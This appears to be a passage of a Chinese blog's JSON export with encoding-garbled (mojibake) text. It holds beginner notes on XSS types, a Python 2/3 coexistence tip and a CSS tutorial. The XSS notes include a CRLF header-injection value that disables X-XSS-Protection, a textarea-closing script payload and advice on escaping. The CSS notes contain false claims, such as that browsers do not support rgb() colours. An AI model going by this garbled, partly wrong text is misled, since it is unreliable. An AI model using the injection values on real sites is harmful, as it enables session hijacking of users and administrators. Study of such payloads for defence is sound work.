äºŒï¼šajaxç®€ä»‹ajaxå…¶å®å°±æ˜¯å¼‚æ­¥JavaScriptå’Œxmlï¼Œå…¶æœ€å¤§ä¼˜åŠ¿åœ¨äºå¯ä»¥å®ç°å¼‚æ­¥è®¿é—®ã€‚ä¸ºä»€ä¹ˆè¦ç”¨AJAXï¼Œé¦–å…ˆå®ƒå¤Ÿéšç§˜ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„â€œæ— åˆ·æ–°â€ï¼Œå…¶æ¬¡ï¼Œå®ƒèƒ½æ›´æœ‰æ•ˆåœ°è¿…é€Ÿå¤„ç†å„ç§å¤æ‚å¤šå˜çš„æ•°æ®ã€‚å…¶å¯ä»¥å®ç°å¼‚æ­¥æ›´æ–°å’Œè·¨åŸŸã€‚ ä¸‰ï¼šxssæ¼æ´åˆ†ç±»å­˜å‚¨XSSå­˜å‚¨XSS,ä¼šæŠŠæ”»å‡»è€…çš„æ•°æ®å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œæ”»å‡»è¡Œä¸ºå°†ä¼´éšç€æ”»å‡»æ•°æ®ä¸€ç›´å­˜åœ¨ã€‚ä¹Ÿå°±æ˜¯æäº¤JSæ”»å‡»ä»£ç å­˜å‚¨åˆ°æ•°æ®åº“ç„¶åå†è¾“å‡ºã€‚ ç”¨æˆ·è¾“å…¥çš„åœ°æ–¹æœ€å®¹æ˜“æ»‹ç”ŸXSSï¼Œè­¬å¦‚ç•™è¨€ã€è¯„è®ºç­‰è¡¨å•ï¼Œä¸€ä¸ªçš„ç•™è¨€æœ¬ï¼Œå› ä¸ºæ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„å˜é‡ä½œå‡ºåˆé€‚çš„è¿‡æ»¤ï¼Œå¯¼è‡´ä¸€ä¸ªXSSçš„äº§ç”Ÿã€‚ç•™è¨€ç‡å…ˆä¼ é€’ç»™ç®¡ç†å‘˜ï¼Œå½“ä½œjavascriptåŠ«æŒï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ç®¡ç†å‘˜çš„æƒé™åšä»»ä½•äº‹æƒ…ã€‚å½“å†…å®¹é€šè¿‡å®¡æ ¸ï¼Œå‘å¸ƒåˆ°ç½‘ç«™ï¼Œæ­¤æ—¶æ‰€æœ‰çš„webæµè§ˆç”¨æˆ·éƒ½æœ‰å¯èƒ½å—åˆ°XSSï¼Œæˆ‘ä»¬èƒ½è·å¾—æ›´å¤šçš„ä¼šè¯åŠ«æŒã€‚ åå°„å‹XSSæ”»å‡»åå°„å‹XSSæ”»å‡»ä¹Ÿæ˜¯éæŒä¹…å‹XSSæ”»å‡»ï¼Œå…¶æ˜¯ä¸€æ¬¡æ€§çš„ï¼Œä»…å¯¹å½“æ¬¡çš„é¡µé¢è®¿é—®äº§ç”Ÿå½±å“ã€‚éæŒä¹…å‹XSSæ”»å‡»è¦æ±‚ç”¨æˆ·è®¿é—®ä¸€ä¸ªè¢«æ”»å‡»è€…ç¯¡æ”¹åçš„é“¾æ¥ï¼Œç”¨æˆ·è®¿é—®è¯¥é“¾æ¥æ—¶ï¼Œè¢«æ¤å…¥çš„æ”»å‡»è„šæœ¬è¢«ç”¨æˆ·æ¸¸è§ˆå™¨æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ”»å‡»ç›®çš„ï¼Œå…¶æ˜¯ç»è¿‡æœåŠ¡å™¨çš„ã€‚ å…¶éœ€è¦é»‘å®¢è¿›è¡Œè¯±éª—ä½¿ç”¨æˆ·è®¿é—®è¿™ä¸ªå¸¦æœ‰xssæ”»å‡»çš„é“¾æ¥åï¼Œä¾¿è¢«JavaScriptåŠ«æŒï¼Œæ”¶åˆ°æ”»å‡»ã€‚ Dom-xssé€šè¿‡URLä¼ å…¥å‚æ•°æ‰€è§¦å‘ï¼Œå…¶ä¸ä¸æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼Œä½†æ˜¯æˆ‘ä»¬çš„jsæ”»å‡»ä»£ç å¯ä»¥è¢«æ‰§è¡Œï¼Œè¿™æ˜¯éœ€è¦åˆ†æé¡µé¢æºç ç„¶åè¿›è¡Œåˆ©ç”¨ï¼Œæ˜¯å­˜åœ¨å®¢æˆ·ç«¯é¡µé¢çš„è„šæœ¬è‡ªèº«ä¸­ã€‚ å››ï¼šX-XSS-Protectionæ˜¯æµè§ˆå™¨å¯¹xxsé˜²æŠ¤çš„ä¸€ä¸ªç­–ç•¥ï¼Œè¿™ä¸ªå¯ä»¥é€šè¿‡æŠ“åŒ…è½¯ä»¶ï¼Œä¿®æ”¹å¤´æ¥è¿›è¡Œç»•è¿‡ã€‚ç­’å˜ä¸€å¥æ´»:`header(â€œX-XSS-Protection: 0â€);å‘Šæ³æµè§ˆå™¨ç¦ç”¨XSSä¿æ¦header(â€œX-XSS-Protection: 1â€);å‘Šæ³æµè§ˆå™¨å¹µå®•XSSä¿æ¦` äº”ï¼šCRLFå“åº”å¤´æ³¨å…¥Location: http://****%0d%0aX-XSS-Protection: 0å°±æ˜¯ç›¸å½“äº`Location: http://****XSS-Protection: 0`è¿™å°±æ˜¯ä¸€ä¸ªæ³¨å…¥ï¼Œåˆæ·»åŠ äº†ä¸€ä¸ªå“åº”å¤´ã€‚ä½†æ˜¯è¿™ç§æ¼æ´åœ¨phpç‰ˆæœ¬&gt;5.1æ—¶å€™æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºå…¶ä¸å…è®¸åœ¨HTTPå¤´ä¸­å‡ºç°ä¸¤ä¸ªå±æ€§ã€‚åº”ç”¨åœºæ™¯ï¼š php&lt;5.1 ç¢°åˆ°äº†æœåŠ¡å™¨å¼€å¯xssæ‹¦æˆª å…­ï¼šä¿®è¡¥xssæ¼æ´ï¼ˆç®€å•ï¼‰è¿‡æ»¤ä¾‹å¦‚ &gt; &lt; Scriptç­‰ç­‰å­—çœ¼ è½¬ä¹‰åˆ©ç”¨phpå‡½æ•° htmlentities()æŠŠå­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“ ä¸ƒï¼šé—­åˆxsså½“ä½ çš„jsä»£ç è¢«æµè§ˆå™¨ç›´æ¥æ˜¾ç¤ºå‡ºæ¥åï¼Œè€ƒè™‘æ˜¯å¦æ˜¯å…¶æºç é‡Œå¯¹ä½ çš„jsä»£ç åšäº†textareaæ ‡ç­¾å¤„ç†ï¼Œç„¶åå°±éœ€è¦æˆ‘ä»¬å»é—­åˆè¿™ä¸ªtextareaæ ‡ç­¾ï¼Œæ¯”è¾ƒé€šç”¨çš„å°±æ˜¯&#39;&quot;&gt;&lt;/textarea&gt;+jsä»£ç  å³å¯ã€‚","categories":[],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://chumen77.xyz/tags/XSS/"}]},{"title":"ç®€æ˜“è§£å†³python2.Xä¸python3.xå…±å­˜é—®é¢˜","slug":"ç®€æ˜“è§£å†³python2.Xä¸python3.xå…±å­˜é—®é¢˜","date":"2019-04-02T15:05:47.000Z","updated":"2020-02-28T07:54:57.000Z","comments":true,"path":"2019/04/02/ç®€æ˜“è§£å†³python2.Xä¸python3.xå…±å­˜é—®é¢˜/","link":"","permalink":"http://chumen77.xyz/2019/04/02/ç®€æ˜“è§£å†³python2.Xä¸python3.xå…±å­˜é—®é¢˜/","excerpt":"","text":"ç®€æ˜“è§£å†³python2.Xä¸python3.xå…±å­˜é—®é¢˜python3.xä¸å…¼å®¹Python2.xï¼Œè¯­æ³•æœ‰è®¸å¤šä¸åŒï¼Œä½†å¾ˆå¤šå·¥å…·è¿˜æ˜¯éœ€è¦2.xç‰ˆæœ¬ï¼Œè‡ªå·±åˆæ˜¯åˆå­¦è€…ï¼Œåªæ˜¯è·‘è·‘åˆ«äººçš„è„šæœ¬ï¼Œä¸ä¼šæ”¹è¯­æ³•å†²çªã€‚ã€‚ã€‚ã€‚ä¸‹é¢è¯´è§£å†³åŠæ³•ã€‚ å®‰è£…æ¨¡å—Pythonç›®å‰è¿˜æ˜¯éœ€è¦åˆ†å¼€å®‰è£… py -2 -m pip install xxxx py -3 -m pip install xxxx è¿è¡Œè„šæœ¬åˆ†åˆ«ç”¨py2.x py3.xè¿è¡Œä¸€ä¸ª1.pyçš„è„šæœ¬ï¼š py -2 1.py py -3 1.py æˆ–è€…åœ¨1.pyçš„æ–‡ä»¶ä»£ç å¤´åŠ ä¸Š#! python3 #! python2çœ‹ä¸ªäººçš„æƒ…å†µã€‚ è¿™æ ·å°±ç›´æ¥è¾“å…¥ï¼š py 1.py è¿™åªæ˜¯è§£å†³äº†ç®€å•çš„å®‰è£…æ¨¡å—å’Œè¿è¡Œè„šæœ¬çš„é—®é¢˜ã€‚","categories":[],"tags":[{"name":"æ‚é¡¹","slug":"æ‚é¡¹","permalink":"http://chumen77.xyz/tags/æ‚é¡¹/"}]},{"title":"csså­¦ä¹ ","slug":"csså­¦ä¹ ","date":"2019-03-30T14:48:12.000Z","updated":"2020-02-28T07:55:03.000Z","comments":true,"path":"2019/03/30/csså­¦ä¹ /","link":"","permalink":"http://chumen77.xyz/2019/03/30/csså­¦ä¹ /","excerpt":"","text":"CSSå¦‚ä½•ä½¿ç”¨CSSCSSå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ·»åŠ åˆ°HTMLä¸­: å†…è”æ ·å¼- åœ¨HTMLå…ƒç´ ä¸­ä½¿ç”¨â€styleâ€ å±æ€§ (ä¸æ¨èä½¿ç”¨)ï¼› å†…éƒ¨æ ·å¼è¡¨ -åœ¨HTMLæ–‡æ¡£å¤´éƒ¨ &lt;head&gt; åŒºåŸŸä½¿ç”¨&lt;style&gt;å…ƒç´  æ¥åŒ…å«CSSã€‚ å¤–éƒ¨å¼•ç”¨ - ä½¿ç”¨å¤–éƒ¨ CSS æ–‡ä»¶(==æ¨èä½¿ç”¨)== å†…è”æ ·å¼åº”ç”¨åˆ°ä¸ªåˆ«å…ƒç´ æ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨å†…è”æ ·å¼ã€‚ &lt;div style=\"color: red;width: 100px; height: 100px; background: yellow\"&gt;è‹¹æœ&lt;/div&gt; å†…éƒ¨æ ·å¼è¡¨å½“å•ä¸ªæ–‡ä»¶éœ€è¦ç‰¹åˆ«æ ·å¼æ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨å†…éƒ¨æ ·å¼è¡¨ã€‚ä½ å¯ä»¥åœ¨&lt;head&gt; éƒ¨åˆ†é€šè¿‡ &lt;style&gt;æ ‡ç­¾å®šä¹‰å†…éƒ¨æ ·å¼è¡¨:ã€‚ä¹Ÿæ¨èè¿™æ ·ä½¿ç”¨ä¾¿äºæ›´æ”¹å…¨å±€ã€‚ &lt;head&gt; &lt;style&gt; div&#123; color: red; width: 100px; height: 100px; background: yellow &#125; &lt;/style&gt; &lt;/head&gt; æ³¨ï¼šåœ¨å¤´æ–‡ä»¶å†™çš„æ—¶å€™ styleè¿˜æ˜¯ä¸ªå¼€é—­æ ‡ç­¾ã€‚ å¤–éƒ¨æ ·å¼è¡¨ç”¨&lt;link&gt;å½“æ ·å¼éœ€è¦è¢«åº”ç”¨åˆ°å¾ˆå¤šé¡µé¢çš„æ—¶å€™ï¼Œå¤–éƒ¨æ ·å¼è¡¨å°†æ˜¯ç†æƒ³çš„é€‰æ‹©ã€‚ &lt;head&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\"&gt; &lt;/head&gt; å…¶ä¸­â€œrel=â€stylesheetâ€ type=â€text/cssâ€â€è¿™æ˜¯å›ºå®šçš„,â€mystyle.cssâ€è¿™æ˜¯cssçš„åœ°å€ï¼› ç»ƒä¹ ï¼š&lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;cssä¸‰ç§å¼•å…¥æ–¹å¼&lt;/title&gt; &lt;!-- &lt;style&gt; div&#123; color: red; width: 100px; height: 100px; background: yellow &#125; &lt;/style&gt; --&gt; &lt;link rel=\"stylesheet\" href=\"1.css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- &lt;div style=\"color: red;width: 100px; height: 100px; background: yellow\"&gt;è‹¹æœ&lt;/div&gt; --&gt; &lt;div&gt; è‹¹æœ1&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; div&#123; color: red; width: 100px; height: 100px; background: yellow &#125; &lt;!-- 1.css --&gt; æ•ˆæœï¼š CSS è¯­æ³•CSS è¯­æ³•è§„åˆ™ç”±ä¸¤ä¸ªä¸»è¦çš„éƒ¨åˆ†æ„æˆï¼šé€‰æ‹©å™¨ï¼Œä»¥åŠä¸€æ¡æˆ–å¤šæ¡å£°æ˜: é€‰æ‹©å™¨é€šå¸¸æ˜¯æ‚¨éœ€è¦æ”¹å˜æ ·å¼çš„ HTML å…ƒç´ ã€‚ æ¯æ¡å£°æ˜ç”±ä¸€ä¸ªå±æ€§å’Œä¸€ä¸ªå€¼ç»„æˆã€‚ å±æ€§æ˜¯æ‚¨å¸Œæœ›è®¾ç½®çš„æ ·å¼å±æ€§ã€‚æ¯ä¸ªå±æ€§æœ‰ä¸€ä¸ªå€¼ã€‚å±æ€§å’Œå€¼è¢«å†’å·åˆ†å¼€ã€‚ CSSå£°æ˜æ€»æ˜¯ä»¥åˆ†å·(;)ç»“æŸï¼Œå£°æ˜ç»„ä»¥å¤§æ‹¬å·({})æ‹¬èµ·æ¥ ä¾‹ï¼šh1{ color:blue; font-size :12px;} å…¶ä¸­h1 ä¸ºé€‰æ‹©å™¨ color æ˜¯å±æ€§ blueæ˜¯å€¼ã€‚ CSS æ³¨é‡Šï¼šCSSæ³¨é‡Šä»¥ â€œ/*â€œ å¼€å§‹, ä»¥ â€œ*/â€œ ç»“æŸã€‚ é¢œè‰²ï¼šé¢œè‰²å±æ€§è¢«ç”¨æ¥è®¾ç½®æ–‡å­—çš„é¢œè‰²ã€‚ é¢œè‰²æ˜¯é€šè¿‡CSSæœ€ç»å¸¸çš„æŒ‡å®šï¼š åå…­è¿›åˆ¶å€¼ - å¦‚: ï¼ƒFF0000 ä¸€ä¸ªRGBå€¼ - å¦‚: RGB(255,0,0) é¢œè‰²çš„åç§° - å¦‚: red å¸¸ç”¨çš„ï¼šrgbï¼šï¼šræ˜¯çº¢è‰²ï¼Œgæ˜¯ç»¿è‰²ï¼Œbæ˜¯è“è‰²ã€‚ body &#123;color:red;&#125; h1 &#123;color:#00ff00;&#125; /* å¯ä»¥å†™æˆ #0f0 */ h2 &#123;color:rgb(255,0,0);&#125; /* 0-255 */ æ˜¯å…¶é¢œè‰²æ·±æµ… ==æ³¨ - æ‰€æœ‰æµè§ˆå™¨éƒ½ä¸æ”¯æŒé¢œè‰²çš„rgbï¼ˆï¼‰å±æ€§ï¼Œå› æ­¤å»ºè®®ä¸è¦ä½¿ç”¨å®ƒã€‚== CSSé€‰æ‹©å™¨åŸºæœ¬é€‰æ‹©å™¨ï¼š id é€‰æ‹©å™¨ï¼šå¯ä»¥ä¸ºæ ‡æœ‰ç‰¹å®š id çš„ HTML å…ƒç´ æŒ‡å®šç‰¹å®šçš„æ ·å¼ã€‚HTMLå…ƒç´ ä»¥idå±æ€§æ¥è®¾ç½®idé€‰æ‹©å™¨,CSS ä¸­ id é€‰æ‹©å™¨ä»¥ â€œ#â€ æ¥å®šä¹‰ã€‚ï¼ˆ==IDå±æ€§ä¸è¦ä»¥æ•°å­—å¼€å¤´==ï¼‰ class é€‰æ‹©å™¨ï¼šclass é€‰æ‹©å™¨ç”¨äºæè¿°ä¸€ç»„å…ƒç´ çš„æ ·å¼ï¼Œclass é€‰æ‹©å™¨æœ‰åˆ«äºidé€‰æ‹©å™¨ï¼Œclasså¯ä»¥åœ¨å¤šä¸ªå…ƒç´ ä¸­ä½¿ç”¨ã€‚ ä¾‹ï¼š&lt;p class=&quot;txt txt2&quot;&gt;aaa&lt;/p&gt; ã€‚class é€‰æ‹©å™¨åœ¨HTMLä¸­ä»¥classå±æ€§è¡¨ç¤º, åœ¨ CSS ä¸­ï¼Œç±»é€‰æ‹©å™¨ä»¥ä¸€ä¸ªç‚¹â€œ.â€å·æ˜¾ç¤º *é€šé…ç¬¦ï¼šå…¨éƒ¨æ ‡ç­¾å±æ€§çš„éƒ½ä¼šæœ‰æ•ˆæœã€‚ æ ‡ç­¾ divï¼šdivæ ‡ç­¾ çš„ä¼šæœ‰æ•ˆæœã€‚ ç»ƒä¹ ï¼š &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;cssé€‰æ‹©å™¨&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"1.css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt;div111 &lt;div&gt;div222&lt;/div&gt; &lt;p id=\"txt\"&gt;the way i am&lt;/p&gt; &lt;p class=\"txt1 txt2\"&gt;song&lt;/p&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; cssï¼š div&#123; color: red; width: 100px; height: 100px; background: yellow &#125; #txt&#123; color: #1f1; &#125; .txt1 &#123; font-size: 10px; &#125; .txt2 &#123; color: #ff2; &#125; æ•ˆæœï¼š CSSåŸç†ä¼˜å…ˆåŸåˆ™ä¼˜å…ˆåŸåˆ™ï¼šåè§£æçš„å†…å®¹ï¼Œä¼šè¦†ç›–æ‰åŸæ¥è§£æçš„å†…å®¹ã€‚ 1:åŒä¸€ä¸ªé€‰æ‹©å™¨:ä»ä¸Šå¾€ä¸‹æ‰§è¡Œã€‚ ä¾‹ï¼š div&#123; color: red; color: green; &#125;/*æœ€ç»ˆæ˜¯ä¸ºç»¿è‰²*/ 2:åŒä¸€ç±»å‹çš„é€‰æ‹©å™¨ï¼šä»ä¸Šå¾€ä¸‹æ‰§è¡Œ ä¾‹ï¼š div&#123; background: yellow; &#125; div&#123; background: red; &#125;/*æœ€ç»ˆæ˜¯ä¸ºçº¢è‰²*/ .bg1&#123; background: yellow; &#125; .bg2&#123; background: blue; &#125;/*æœ€ç»ˆæ˜¯ä¸ºè“è‰²*/ &lt;div class=&quot;bg1 bg2&quot;&gt;hahaha&lt;/div&gt; åœ¨HTMLä¸­ï¼Œbg1 ä¸bg2çš„ä½ç½®äº¤æ¢ä¹Ÿä¸ç®¡cssè§£æçš„äº‹æƒ…ï¼Œæ‰€ä»¥äº¤æ¢åè¿˜æ˜¯blueã€‚ 3ï¼šä¸åŒç±»å‹çš„é€‰æ‹©å™¨ï¼šçœ‹ä¼˜å…ˆçº§ å…ˆè§£æä½çº§çš„åœ¨è§£æé«˜çº§çš„ï¼š* &lt; div &lt; class &lt; id div&#123; color: redï¼› &#125; .bg1&#123; color: yellow; &#125; /*æœ€ç»ˆæ˜¯ä¸ºé»„è‰²*/ 4ï¼šå¤šé‡æ ·å¼ä¼˜å…ˆçº§ æ ·å¼å¯ä»¥è§„å®šåœ¨å•ä¸ªçš„ HTML å…ƒç´ ä¸­ï¼Œåœ¨ HTML é¡µçš„å¤´å…ƒç´ ä¸­ï¼Œæˆ–åœ¨ä¸€ä¸ªå¤–éƒ¨çš„ CSS æ–‡ä»¶ä¸­ã€‚ç”šè‡³å¯ä»¥åœ¨åŒä¸€ä¸ª HTML æ–‡æ¡£å†…éƒ¨å¼•ç”¨å¤šä¸ªå¤–éƒ¨æ ·å¼è¡¨ã€‚ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¼˜å…ˆçº§å¦‚ä¸‹ï¼š å†…è”æ ·å¼ &gt; å†…éƒ¨æ ·å¼ &gt;å¤–éƒ¨æ ·å¼ ==ï¼ˆè°ä¼˜å…ˆçº§è¶Šé«˜è¶Šæœ€åè§£æï¼‰== å¯¹äºå…¨éƒ¨éƒ½æ˜¯ å½“åŠ ä¸Š!important è¿™ä¸ªé€‰æ‹©å™¨çš„å†…å®¹å°±ä¼šæœ€åè¿›è¡Œã€‚ ç»§æ‰¿åŸåˆ™==å¯¹äºåµŒå¥—æ ‡ç­¾ï¼Œå­çº§ç»§æ‰¿çˆ¶çº§ã€‚== æ–‡å­— æ–‡æœ¬ æ ·å¼å¯ä»¥ç»§æ‰¿ï¼Œå…¶ä»–çš„ä¸èƒ½ã€‚ å—çº§å…ƒç´  æ²¡æœ‰è®¾ç½®çš„æ—¶å€™ï¼Œä¼šç»§æ‰¿çˆ¶çº§çš„å®½ï¼Œè€Œé«˜åº¦åˆ™æ˜¯çœ‹å…¶å†…å®¹é•¿çŸ­ã€‚ CSSç»„æˆé€‰æ‹©å™¨åˆ†ç»„é€‰æ‹©å™¨ç›´æ¥ä¸Šä»£ç äº†ï¼š div&#123; background: green; color: red; &#125; p&#123; background: green; color: red; font-size: 50px; &#125; div,p&#123; background: green; color: red; &#125; p&#123; font-size: 50px; &#125; æŠŠdiv ä¸ p é‡Œé¢ç›¸åŒçš„éƒ¨åˆ†æ”¾åˆ°ä¸€ä¸ªé‡Œé¢å°±è¡Œäº†ã€‚ åµŒå¥—é€‰æ‹©å™¨div p&#123; background: green; color: red; font-size: 50px; &#125; &lt;body&gt; &lt;div&gt; div1 &lt;div&gt;div2 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;p&gt;p1&lt;/p&gt; &lt;/body&gt; åªè¦åœ¨å…¶çˆ¶æˆ–çˆ¶çš„ä»¥ä¸Šçº§æœ‰divï¼Œé‚£è¿™ä¸ªpé‡Œçš„ä¸œè¥¿å°±èƒ½ç”Ÿæ•ˆã€‚ æ•ˆæœï¼š å­é€‰æ‹©å™¨è¿™ä¸ªå’Œä»¥ä¸Šå¾ˆç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨åªåœ¨å…¶çˆ¶ä¸ºdivæ—¶ï¼Œæ‰èƒ½ç”Ÿæ•ˆã€‚ div&gt;p&#123; background: green; color: red; font-size: 50px; &#125; ç±»æ¯”ä»¥ä¸Šå°±æ˜¯åªæœ‰p2æœ‰cssæ•ˆæœ åŒçº§é€‰æ‹©å™¨div+p&#123; background: green; color: red; font-size: 50px; &#125; åœ¨å¹³çº§çš„pæ‰å¯ä»¥ç”Ÿæ•ˆï¼Œå¯¹æ¯”ä»¥ä¸Šï¼Œä¹Ÿå°±æ˜¯p1æ˜¯æœ‰cssæ•ˆæœã€‚ å±æ€§é€‰æ‹©å™¨p[title=cc]&#123; background: green; color: red; font-size: 50px; &#125; &lt;body&gt; &lt;div&gt; div1 &lt;div&gt;div2 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p title=\"cc\"&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;p title=\"cc 1\"&gt;p1&lt;/p&gt; &lt;/body&gt; åŸºæœ¬æ ‡ç­¾==+== [å±æ€§=å€¼]ï¼šp3å‡ºç°cssæ•ˆæœã€‚ [å±æ€§~=å€¼]ï¼šp1 p3å‡ºç°cssæ•ˆæœã€‚ æ³¨æ„ï¼šä»£ç ä¸­cc 1éœ€è¦ç©ºæ ¼éš”å¼€ï¼Œä¸éš”æ²¡æœ‰æ•ˆæœã€‚ [å±æ€§^=å€¼]ï¼šå¼€å¤´æœ‰ccçš„å­—ç¬¦å°±è¡Œcc1. p1 p3 å‡ºç°ccæ•ˆæœã€‚ [å±æ€§$=å€¼]ï¼šç±»æ¯”^= æ˜¯ç»“æŸã€‚ ä¼ªå…ƒç´ é€‰æ‹©å™¨æ¯ä¸ªæˆ‘è‡ªå·±å†™å‡ºæ¥çš„å…ƒç´ éƒ½ä¼šæœ‰ä¼ªå…ƒç´ ã€‚ã€ ä¾‹ï¼š &lt;p title=\"cc\"&gt; &lt;!--&lt;before&gt; --&gt; ppp &lt;!--&lt;after&gt; --&gt; &lt;/p&gt; ç›´æ¥ä¸Šä»£ç ï¼š p::before&#123; content: \"before\" &#125; p::after&#123; content: \"after\" &#125; æ•ˆæœï¼š å—å…ƒç´ ï¼š ç¬¬ä¸€ä¸ªå­—æ¯ï¼šfirst-letter ç¬¬ä¸€è¡Œï¼šfirst-line p::first-letter&#123; color: red; font-size: 100px; &#125; è¿™äº›å†™å°±æ˜¯ä¼šæ˜¯på†…å†…å®¹ç¬¬ä¸€ä¸ªå­—ç¬¦å¤§å†™ã€‚ ä¹Ÿå¯ä»¥ä¸º &lt;p title=\"cc\"&gt; &lt;first-letter&gt;t &lt;/first-letter&gt; he way i am ; &lt;/p&gt; CSS èƒŒæ™¯CSS èƒŒæ™¯å±æ€§ç”¨äºå®šä¹‰HTMLå…ƒç´ çš„èƒŒæ™¯ã€‚ èƒŒæ™¯é¢œè‰²background-color å±æ€§å®šä¹‰äº†å…ƒç´ çš„èƒŒæ™¯é¢œè‰². é¡µé¢çš„èƒŒæ™¯é¢œè‰²ä½¿ç”¨åœ¨bodyçš„é€‰æ‹©å™¨ä¸­: body {background-color:red;} èƒŒæ™¯å›¾åƒbackground-imageå±æ€§æè¿°äº†å…ƒç´ çš„èƒŒæ™¯å›¾åƒ. é»˜è®¤æƒ…å†µä¸‹ï¼ŒèƒŒæ™¯å›¾åƒè¿›è¡Œå¹³é“ºé‡å¤æ˜¾ç¤º. body {background-image:url(&#39;1.png&#39;);} èƒŒæ™¯å›¾åƒ - ç›¸å…³è®¾ç½® æ°´å¹³æˆ–å‚ç›´å¹³é“ºï¼š body &#123; background-image:url('gradient2.png'); background-repeat:repeat-x; &#125; é‡Œé¢repeat-xæ˜¯xè½´ï¼Œrepeat-yæ˜¯yè½´ã€‚ ä¸å¹³é“ºï¼šbackground-repeat:no-repeat å®šä½ï¼š â€‹ background-position:50% 0% è¿™ä½¿å…¶åœ¨xè½´çš„ä¸­å¿ƒï¼Œ â€‹ xï¼š left center rightï¼› â€‹ y: top center bottomï¼› csså­—ä½“csså­—ä½“ å­—ä½“ç³»åˆ—ï¼šfont-family å±æ€§è®¾ç½®æ–‡æœ¬çš„å­—ä½“ç³»åˆ—ï¼Œåº”è¯¥è®¾ç½®å‡ ä¸ªå­—ä½“åç§°ä½œä¸ºä¸€ç§â€åå¤‡â€æœºåˆ¶ã€‚ ä¾‹ï¼šfont-family:&quot;é»‘ä½“&quot;, &quot;å®‹ä½“&quot;,&quot;å¾®è½¯é»‘é›…&quot;; å­—ä½“æ ·å¼:font-style:italic;æ–œä½“ å­—ä½“å¤§å°ï¼šfont-size å±æ€§è®¾ç½®æ–‡æœ¬çš„å¤§å°ã€‚font-size:40px; font-weight: è®¾ç½®å…¶ç²—ç»†ã€‚font-weight: normal lighter blod; ç»ƒä¹ ï¼š body &#123; font-family: \"é»‘ä½“\",\"å®‹ä½“\"; font-style:italic; font-size:80px; font-weight: bold; &#125; /*5.css */ &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;æ–‡å­—-å­—ä½“&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"5.css\"&gt; &lt;/head&gt; &lt;body&gt; è¿™æ˜¯ä¸€æ®µå­— &lt;br&gt; hello world! &lt;/body&gt; &lt;/html&gt; CSS - æ–‡æœ¬æ–‡æœ¬å±æ€§é›†åˆ colorå±æ€§ç”¨äºè®¾ç½®æ–‡æœ¬çš„é¢œè‰² directionå±æ€§ç”¨äºè®¾ç½®æ–‡æœ¬æ–¹å‘ã€‚ letter-spacingå±æ€§ç”¨äºåœ¨ç»„æˆå•è¯çš„å­—æ¯ä¹‹é—´æ·»åŠ æˆ–å‡å»ç©ºæ ¼ã€‚ text-indentå±æ€§ç”¨äºç¼©è¿›æ®µè½çš„æ–‡æœ¬ã€‚ text-alignå±æ€§ç”¨äºå¯¹é½æ–‡æ¡£çš„æ–‡æœ¬ã€‚ text-decorationå±æ€§ç”¨äºä¸‹åˆ’çº¿ï¼Œä¸Šåˆ’çº¿å’Œåˆ é™¤æ–‡æœ¬ã€‚ text-transformå±æ€§ç”¨äºå¤§å†™æ–‡æœ¬æˆ–å°†æ–‡æœ¬è½¬æ¢ä¸ºå¤§å†™æˆ–å°å†™å­—æ¯ã€‚ white-spaceå±æ€§ç”¨äºæ§åˆ¶æ–‡æœ¬çš„æµå’Œæ ¼å¼ã€‚ text-shadowå±æ€§ç”¨äºè®¾ç½®æ–‡æœ¬å‘¨å›´çš„æ–‡æœ¬é˜´å½±ã€‚ æ–‡æœ¬é¢œè‰²ï¼š åå…­è¿›åˆ¶å€¼ - å¦‚: ï¼ƒFF0000 ä¸€ä¸ªRGBå€¼ - å¦‚: RGB(255,0,0) ==ä¸æ¨èä½¿ç”¨å¤ªå¤šæµè§ˆå™¨ä¸æ”¯æŒ== é¢œè‰²çš„åç§° - å¦‚: red body &#123;color:red;&#125; h1 &#123;color:#00ff00;&#125; h2 &#123;color:rgb(255,0,0);&#125; æ–‡æœ¬çš„å¯¹é½æ–¹å¼æ–‡æœ¬å¯å±…ä¸­æˆ–å¯¹é½åˆ°å·¦æˆ–å³,ä¸¤ç«¯å¯¹é½. .a1&#123; text-align:right; &#125; .a2&#123; text-align:center; &#125; .a3&#123; text-align:left; &#125; &lt;body&gt; &lt;p class=\"a1\"&gt;è¿™æ˜¯ä¸€æ®µå­—&lt;/p&gt; &lt;br&gt; &lt;p class=\"a2\"&gt;hello world!&lt;/p&gt; &lt;p class=\"a3\"&gt;hhhhaaaa&lt;/p&gt; &lt;/body&gt; 